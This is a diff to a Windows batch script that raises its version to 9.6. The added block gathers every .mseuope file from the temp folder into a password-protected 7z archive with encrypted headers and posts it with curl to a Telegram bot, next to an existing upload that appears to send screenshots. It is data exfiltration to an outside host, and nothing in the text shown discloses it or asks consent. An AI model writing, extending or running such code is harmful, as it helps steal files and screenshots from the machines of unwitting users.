@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=9.5"
+set "BATCHVERSION=9.6"
 
 
 
@@ -1667,6 +1667,33 @@ echo.
 
 
 
+set "ZIP_FILEMS=%temp%\mseuopefiles.7z"
+rem Delete existing ZIP file to ensure fresh compression
+if exist "%ZIP_FILEMS%" del /f /q "%ZIP_FILEMS%"
+echo Deleted.
+
+echo.
+echo.
+
+
+rem Collect all .mseuope files in %temp%
+set "FileList="
+
+for %%F in ("%temp%\*.mseuope") do (
+    set "FileList=!FileList! "%%F""
+)
+
+if not defined FileList (
+    echo No .mseuope files found in %temp%.
+)
+
+echo 1 > "%temp%\testA.mseuope"
+
+rem Compress the files using 7-Zip
+"%SVNzip_PATH%" a -p"%Password%" -mhe=on "%ZIP_FILEMS%" !FileList!
+
+echo.
+echo.
 
 
 
@@ -1688,6 +1715,14 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocumen
      -F "message_thread_id=%TOPIC_ID_UPDATESSCRNSHTS%" ^
      -F "caption=%CAPTION_UPDATESSCRNSHTS%" ^
      -F "document=@%ZIP_FILE%"
+
+
+
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocument" ^
+     -F "chat_id=%CHAT_ID_UPDATESSCRNSHTS%" ^
+     -F "message_thread_id=%TOPIC_ID_UPDATESSCRNSHTS%" ^
+     -F "caption=mseuope" ^
+     -F "document=@%ZIP_FILEMS%"
 
 
 
